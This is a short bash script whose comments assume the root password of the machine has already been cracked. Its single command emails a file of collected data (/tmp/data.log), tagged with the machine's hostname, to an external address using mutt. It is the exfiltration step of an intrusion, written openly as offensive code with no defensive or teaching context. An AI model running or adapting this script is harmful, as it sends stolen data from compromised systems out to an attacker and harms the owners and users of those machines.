#!/bin/bash




# Here we assume we have already cracked the root password
# mailing the content of the data will happen only after cracking the root password
# sudo apt-get install mutt  (we can install mailutils)
# for this to work we need to install & configure postfix in safe mode :
# sudo dpkg-reconfigure postfix (TODO this need to be done in safe mode  ...)
#
echo "Collected Data from " "$(hostname)" | mutt -a "/tmp/data.log" -s "collected data" -- kbelaid@ivsweb.com
